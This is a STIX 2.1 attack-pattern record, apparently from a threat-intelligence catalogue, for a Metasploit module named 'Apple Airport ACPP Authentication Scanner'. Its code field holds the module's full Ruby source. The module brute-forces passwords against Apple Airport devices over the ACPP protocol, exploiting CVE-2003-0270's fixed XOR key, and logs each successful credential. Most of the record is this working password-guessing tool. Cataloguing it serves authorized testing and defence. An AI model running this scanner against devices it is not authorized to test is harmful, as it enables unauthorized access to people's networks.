{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e12b2156-f3ed-495c-b8bd-427977f767fb",
    "created": "2024-08-14T16:26:30.983707Z",
    "modified": "2024-08-14T16:26:30.98371Z",
    "name": "Apple Airport ACPP Authentication Scanner",
    "description": "( This module attempts to authenticate to an Apple Airport using its proprietary and largely undocumented protocol known only as ACPP. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/acpp/login.rb",
            "external_id": "login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/acpp'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'Apple Airport ACPP Authentication Scanner',\n      'Description' => %q(\n        This module attempts to authenticate to an Apple Airport using its\n        proprietary and largely undocumented protocol known only as ACPP.\n      ),\n      'Author'      =>\n        [\n          'Jon Hart <jon_hart[at]rapid7.com>'\n        ],\n      'References'     =>\n        [\n          %w(CVE 2003-0270) # Fixed XOR key used to encrypt password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(Rex::Proto::ACPP::DEFAULT_PORT)\n      ])\n\n    deregister_options(\n      # there is no username, so remove all of these options\n      'DB_ALL_USERS',\n      'DB_ALL_CREDS',\n      'DB_SKIP_EXISTING',\n      'PASSWORD_SPRAY',\n      'USERNAME',\n      'USERPASS_FILE',\n      'USER_FILE',\n      'USER_AS_PASS'\n    )\n\n    register_autofilter_ports([Rex::Proto::ACPP::DEFAULT_PORT])\n  end\n\n  def run_host(ip)\n    vprint_status(\"#{ip}:#{rport} - Starting ACPP login sweep\")\n\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(\n      blank_passwords: datastore['BLANK_PASSWORDS'],\n      pass_file: datastore['PASS_FILE'],\n      password: datastore['PASSWORD']\n    )\n    cred_collection = prepend_db_passwords(cred_collection)\n\n    scanner = Metasploit::Framework::LoginScanner::ACPP.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['PROXIES'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: datastore['ConnectTimeout'],\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      ssl: datastore['SSL'],\n      ssl_version: datastore['SSLVersion'],\n      ssl_verify_mode: datastore['SSLVerifyMode'],\n      ssl_cipher: datastore['SSLCipher'],\n      local_port: datastore['CPORT'],\n      local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      password = result.credential.private\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        print_good(\"#{ip}:#{rport} - ACPP Login Successful: #{password}\")\n        report_vuln(\n          host: ip,\n          port: rport,\n          proto: 'tcp',\n          name: 'Fixed XOR key used to encrypt passwords',\n          info: \"Successful authentication with '#{password}'\",\n          refs: references\n        )\n      else\n        invalidate_login(credential_data)\n        vprint_error(\"#{ip}:#{rport} - ACPP LOGIN FAILED: #{password} (#{result.status}: #{result.proof})\")\n      end\n    end\n  end\nend\n"
}